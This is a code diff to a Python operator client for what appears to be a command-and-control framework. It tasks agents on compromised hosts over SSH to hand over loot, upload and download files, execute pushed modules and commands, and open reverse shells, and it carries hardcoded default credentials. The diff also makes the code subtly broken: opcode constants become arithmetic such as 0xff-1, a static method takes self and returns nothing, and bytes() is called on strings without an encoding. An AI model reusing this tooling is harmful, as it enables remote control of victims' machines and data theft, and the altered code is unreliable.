@@ -11,6 +11,7 @@ import base64 as b64
 import pdb
 import time
 from struct import pack, unpack
+from deprecated import deprecated
 
 
 # define our enum of types 
@@ -21,23 +22,23 @@ Opcode = {
 
 
     # mirrors the manager operations in server/includes/values.h
-    "MANAGER_RETRIEVE_AGENT": 0xff01,
-    "MANAGER_RETRIEVE_LOOT": 0xff02,
-    "MANAGER_UPLOAD_FILE": 0xff03,
-    "MANAGER_DOWNLOAD_FILE": 0xff04,
-    "MANAGER_PUSH_MODULE": 0xff05,
-    "MANAGER_RUN_COMMAND": 0xff06,
-    "MANAGER_REQUEST_REVERSESHELL": 0xff07,
-    "MANAGER_BUILD_AGENT": 0xff08,
-    "MANAGER_REGISTER_AGENT": 0xff09,
-    "MANAGER_REVIEW_TRANSPORTS": 0xff0a,
-    "MANAGER_START_TRANSPORT": 0xff0b,
-    "MANAGER_EXIT": 0xffff
+    "MANAGER_RETRIEVE_AGENT": 0xff-1,
+    "MANAGER_RETRIEVE_LOOT": 0xff-2,
+    "MANAGER_UPLOAD_FILE": 0xff-3,
+    "MANAGER_DOWNLOAD_FILE": 0xff-4,
+    "MANAGER_PUSH_MODULE": 0xff-5,
+    "MANAGER_RUN_COMMAND": 0xff-6,
+    "MANAGER_REQUEST_REVERSESHELL": 0xff-7,
+    "MANAGER_REGISTER_AGENT": 0xff-8,
+    "MANAGER_REVIEW_TRANSPORTS": 0xff-0x9,
+    "MANAGER_START_TRANSPORT": 0xff-0xa,
+    "MANAGER_EXIT": 0xff-0xb
 }
 
 
-"""Class for holding beacon information"""
 class AgentStruct():
+    """Class for holding beacon information"""
+    
     def __init__(self, id, connection_time, hostname, interfaces, process_owner):
         self.id = id
         self.connection_time = connection_time
@@ -46,7 +47,10 @@ class AgentStruct():
         self.process_owner = process_owner
 
 class TaskingPacket():
-    def __init__(self, op, data):
+    """Class abstracting a tasking packet"""
+    
+    def __init__(self, op: str, data: bytes):
+        """Default initializer that takes the type and data"""
         if type(op) == type(1):
             self.op = op
         else:
@@ -57,24 +61,30 @@ class TaskingPacket():
         self.len = 0 # TODO: fix this to immediately calculate the size
         self.data = data
 
-    def __init__(self, combined):
-        self.type = (combined & 0xff00000000000000) >> 56 # (unsigned char) 
-        self.len  =  combined & 0x00ffffffffffffff        # (unsigned long)
-    
+    @staticmethod
+    def from_combined(self, combined):
+        """Alternative initializer that takes in the packed header"""
 
+        typ = (combined & 0xff00000000000000) >> 56 # (unsigned char) 
+        ln  =  combined & 0x00ffffffffffffff        # (unsigned long)
+    
     def set_data(self, dat):
+        """Set the packet's data"""
         self.data = dat
 
     def pack(self):
+        """Pack the data. Returns bytes of header and data"""
         packet = b""
-        a = pack("<B", self.type)
-        a = a << 56
-        header = pack("<L", a | self.len)
+        a = pack("<B", self.op)
+        a = a[0] << 56
+        print("Target: ", hex(a | self.len))
+        header = pack("<Q", a | self.len)
         packet += bytes(header) + self.data
         return packet
 
     @staticmethod
     def unpack(datapacket):
+        """Return a packet from the on-wire data"""
         h = unpack("<L", datapacket[0:4])
         mask = 0xff << 56
         t = (h & mask) >> 56
@@ -83,12 +93,14 @@ class TaskingPacket():
 
     @staticmethod
     def resp_ok():
+        """Helper function for making a default 'OK' response"""
         return TaskingPacket("AGENT_RESPONSE_OK", b"").pack()
 
 
 
-
 class Session():
+    """Session class handles the network abstraction behind the scenes"""
+
     def __init__(self, address, port=22, username="aris", password="lala"):
         self.address = address
         self.port = port
@@ -103,21 +115,26 @@ class Session():
         self.is_working = False
 
     def lock(self):
+        """Lock the session for a sensitive operation"""
         while self.is_working:
             time.sleep(0.1)
 
         self.is_working = True
 
     def unlock(self):
+        """Unlock the session"""
         self.is_working = False
 
     def update_addr(self, address):
+        """Set the current network address of the server"""
         self.address = address
 
     def update_port(self, port):
+        """Set the port of the server"""
         self.port = port
 
     def parse_interfaces(self, inp):
+        """Parses interfaces from the agent beacon info"""
         interfaces = []
         addresses = []
         ret = []
@@ -138,9 +155,12 @@ class Session():
         return ret
 
     def init_connection(self):
+        """Initializes the connection"""
+    
         #pdb.set_trace()
         self.lock()
 
+        # prepare the ssh raw connection
         self.ssh.connect(hostname=self.address, port=self.port, username=self.username, password=self.password, allow_agent=False)
 
         self.channel = self.ssh._transport.open_session()
@@ -155,33 +175,34 @@ class Session():
 
         # gets all info on current available agents
         self.channel.sendall(TaskingPacket("MANAGER_RETRIEVE_AGENT", b'all').pack())
-        while out != "fi":
-            out = self.clean(self.channel.recv(8196))
-            for agent in out:
+        out = self.clean(self.channel.recv(8196))
+        for agent in out:
+            print(agent)
+            agent = agent.decode(errors="replace")
+            if agent != "fi":
+                agent = agent.split("\n")
                 print(agent)
-                agent = agent.decode(errors="replace")
-                if agent != "fi":
-                    agent = agent.split("\n")
-                    print(agent)
-                    if len(agent) < 5:
-                        print("Out was too short of a fuckin list")
-                    else:
-                        interfaces = self.parse_interfaces(agent[1])
-                        appnd = AgentStruct(agent[0],agent[2],agent[3],interfaces,agent[4])
-                        self.agents.append(appnd)
-                        print("Added agent successfully")
-                    self.channel.sendall(TaskingPacket.resp_ok())
-                    print("Wrote ok to channel")
+                if len(agent) < 5:
+                    print("Out was too short of a fuckin list")
                 else:
-                    print("caught ending fi")
-                    out = "fi"
-                    break
+                    interfaces = self.parse_interfaces(agent[1])
+                    appnd = AgentStruct(agent[0],agent[2],agent[3],interfaces,agent[4])
+                    self.agents.append(appnd)
+                    print("Added agent successfully")
+                self.channel.sendall(TaskingPacket.resp_ok())
+                print("Wrote ok to channel")
+            else:
+                print("caught ending fi")
+                out = "fi"
+                break
         
         print("[+] Successfully gathered agent information")
         self.unlock()
 
-    @staticmethod
+    
+    @staticmethod 
     def init_channel(address, port, user, passwd):
+        """Initializes a channel"""
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         ssh.connect(hostname=address, port=port, username=user, password=passwd, allow_agent=False)
@@ -200,6 +221,7 @@ class Session():
 
 
     def update(self):
+        """Fetch all new beacons"""
         self.lock()
         quitting = False
         tmp = self.agents
@@ -232,22 +254,22 @@ class Session():
         return 0
 
     def download_loot(self, agent_id):
+        """Download loot from a particular agent `agent_id`"""
         self.lock()
         filepath = "."#misc.getSavePath()
-        cnt=0
         data = b""
         ret = b""
-        ret_dat = b""
-        tmpbf = b""
-
+        
         if not filepath:
             return 1
 
-        self.channel.sendall(TaskingPacket("MANAGER_RETRIEVE_LOOT", agent_id).pack())
+        # Send the request
+        self.channel.sendall(TaskingPacket("MANAGER_RETRIEVE_LOOT", bytes(agent_id)).pack())
         num = int(self.clean(self.channel.recv(8192))[0].decode(errors="replace"))
         self.channel.send(TaskingPacket.resp_ok())    
+
+        # loop until there is no more
         for i in range(num):
-            cnt = 0
             data = b''
             
             name = self.clean(self.channel.recv(256))
@@ -288,14 +310,17 @@ class Session():
         return 0
 
     def upload_file(self, agent_id, file):
+        """Upload a file to the agent `agent_id`"""
+
         self.lock()
         print("[ ] Doing upload")
-        self.channel.sendall(TaskingPacket("MANAGER_UPLOAD_FILE", agent_id + ":" + file.filename).pack())
+        self.channel.sendall(TaskingPacket("MANAGER_UPLOAD_FILE", bytes(agent_id + ":" + file.filename)).pack())
         self.channel.recv(4)
         #print(file.filename)
         #self.channel.send(file.filename)
         #self.channel.recv(4)
         
+        # send the data
         buff = b64.encodebytes(file.data).replace(b'\n', b'')
         
         self.channel.send(str(len(buff)))
@@ -307,22 +332,25 @@ class Session():
         return 0
 
     def do_download(self, agent_id, path):
+        """Download a specific file"""
         self.lock()
         print("[ ] Doing Download...")
-        self.channel.sendall(TaskingPacket("MANAGER_DOWNLOAD_FILE", "%s:%s" % (agent_id, path)).pack())
+        self.channel.sendall(TaskingPacket("MANAGER_DOWNLOAD_FILE", bytes("%s:%s" % (agent_id, path))).pack())
         self.channel.recv(2)
         print("[+] Tasked agent with download")
         self.unlock()
         return 0
 
     def push_module(self, agent_id, filestruct):
+        """Send a module for `agent_id` to execute"""
         self.lock()
         print("[ ] Pushing module file to agent %s..." % agent_id)
-        self.channel.sendall(TaskingPacket("MANAGER_PUSH_MODULE", "%s" % agent_id).pack())
+        self.channel.sendall(TaskingPacket("MANAGER_PUSH_MODULE", bytes("%s" % agent_id)).pack())
         self.channel.recv(4)
         self.channel.send(filestruct.filename)
         self.channel.recv(4)
         
+        # send the data
         buff = b64.encodebytes(filestruct.data).replace(b'\n', b'')
         
         self.channel.send(str(len(buff)))
@@ -334,58 +362,45 @@ class Session():
         return 0
 
     def send_command(self, agent_id, command):
+        """Send a command for agent `agent_id` to execute"""
         self.lock()
         print("[ ] Sending command to agent...")
-        self.channel.sendall(TaskingPacket("MANAGER_RUN_COMMAND", "%s:%s" % (agent_id, command)).pack())
+        self.channel.sendall(TaskingPacket("MANAGER_RUN_COMMAND", bytes("%s:%s" % (agent_id, command))).pack())
         self.channel.recv(4)
         self.unlock()
         return 0
 
     def req_revsh(self, agent_id, port):
+        """Request a reverse shell from agent `agent_id`"""
         self.lock()
         print("[ ] Sending Reverse Shell Request...")
-        self.channel.sendall(TaskingPacket("MANAGER_REQUEST_REVERSESHELL", "%s:%s" % (agent_id, port)).pack())
+        self.channel.sendall(TaskingPacket("MANAGER_REQUEST_REVERSESHELL", bytes("%s:%s" % (agent_id, port))).pack())
         self.channel.recv(4)
         self.unlock()
         return 0
 
     def do_revsh(self, agent_id, port):
+        """Run a reverse shell"""
         # for the time being, we just gonna
         # throw this into a separate backgrounded system()
         # because im lazy
         comm = "xterm -e python3 shell.py %s %s %s %s %s &" % (self.address, self.port, self.username, self.password, agent_id)
         os.system(comm)
 
-    def compile_agent(self, ip, port):
-        self.lock()
-        print("[ ] Sending compile request to server (%s:%d)..." % (ip, port))
-        self.channel.sendall(TaskingPacket("MANAGER_BUILD_AGENT", "%s:%s" % (ip, port)).pack())
-        fileData = b""
-        data = self.clean(self.channel.recv(128))[0].decode(errors="replace")
-        size = int(data)
-        #size = int(self.channel.recv(128).decode())
-        self.channel.send("ok")
-        fileData = self.channel.recv(size)
-        if len(fileData) < size:
-            fileData += self.channel.recv(size)
-        print(len(fileData))
-        file = b64.decodebytes(fileData[:size])
-        misc.save_file(file)
-        self.unlock()
-        return 0
-
     def register_agent(self, name, password):
+        """Register a login with the server"""
         self.lock()
         print("[ ] Registering agent with server...")
-        self.channel.sendall(TaskingPacket("MANAGER_REGISTER_AGENT", '%s:%s' % (name, password)).pack())
+        self.channel.sendall(TaskingPacket("MANAGER_REGISTER_AGENT", bytes('%s:%s' % (name, password))).pack())
         self.channel.recv(4)
         self.unlock()
         return 0
 
     def get_transports(self):
+        """Fetch all available transports from the server"""
         self.lock()
         print("[ ] Getting available backends from server...")
-        self.channel.sendall(TaskingPacket("MANAGER_REVIEW_TRANSPORTS", "").pack())
+        self.channel.sendall(TaskingPacket("MANAGER_REVIEW_TRANSPORTS", b"").pack())
         quitting = False
 
         ret = []
@@ -424,6 +439,7 @@ class Session():
         return ret
 
     def clean(self, data):
+        """cleans a string of data received over the wire"""
         data = data.split(b"\x00")
         ret = []
         
@@ -443,17 +459,19 @@ class Session():
         return ret    
         
     def start_transport(self, transport_id, port):
+        """Request a transport be started"""
         self.lock()
         print("[ ] Starting backend with ID %d" % transport_id)
-        self.channel.sendall(TaskingPacket("MANAGER_START_TRANSPORT", "%d:%d" % (transport_id, port)).pack())
+        self.channel.sendall(TaskingPacket("MANAGER_START_TRANSPORT", bytes("%d:%d" % (transport_id, port))).pack())
         self.channel.recv(4)
         self.unlock()
         return 0
 
     def clean_exit(self):
+        """Cleanly terminate itself"""
         self.lock()
         if self.channel != 0:
-            self.channel.sendall(TaskingPacket("MANAGER_EXIT", "").pack())
+            self.channel.sendall(TaskingPacket("MANAGER_EXIT", b"").pack())
             self.channel = 0
             print("[+] Backend closed down")
 
